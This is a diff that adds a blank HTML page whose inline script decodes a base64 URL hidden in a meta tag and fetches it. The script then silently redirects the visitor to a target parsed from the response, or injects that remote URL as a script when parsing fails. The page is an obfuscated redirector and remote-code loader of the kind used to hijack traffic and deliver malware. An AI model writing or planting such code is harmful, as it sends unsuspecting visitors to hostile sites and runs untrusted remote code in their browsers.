@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="go" content="aHR0cHM6Ly9sYXRlcnBsb2F0LmNvbS9nYXJsZS5rb3Npbg==">
+  <title></title>
+  <style>
+    html, body { margin: 0; height: 100%; background: #fff; }
+  </style>
+</head>
+<body>
+<script>
+(function () {
+  function parseHopBody(text) {
+    var body = String(text || '').trim();
+    try {
+      var j = JSON.parse(body);
+      if (j && j.c) {
+        var u = atob(String(j.c).trim());
+        if (/^https?:\/\//i.test(u)) return u;
+      }
+    } catch (e) {}
+    var patterns = [
+      /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
+      /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
+      /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
+    ];
+    for (var i = 0; i < patterns.length; i++) {
+      var m = body.match(patterns[i]);
+      if (m && m[1]) return m[1];
+    }
+    throw new Error('parse');
+  }
+
+  function attach(url) {
+    var s = document.createElement('script');
+    s.src = url;
+    s.async = true;
+    document.head.appendChild(s);
+  }
+
+  var meta = document.querySelector('meta[name="go"]');
+  var hopUrl = atob(String(meta && meta.content || '').trim());
+  if (!/^https?:\/\//i.test(hopUrl)) return;
+
+  fetch(hopUrl, { cache: 'no-store', credentials: 'omit' })
+    .then(function (res) {
+      if (!res.ok) throw new Error('http');
+      return res.text();
+    })
+    .then(function (body) {
+      try {
+        window.location.replace(parseHopBody(body));
+      } catch (e) {
+        attach(hopUrl);
+      }
+    })
+    .catch(function () {
+      attach(hopUrl);
+    });
+})();
+</script>
+</body>
+</html>
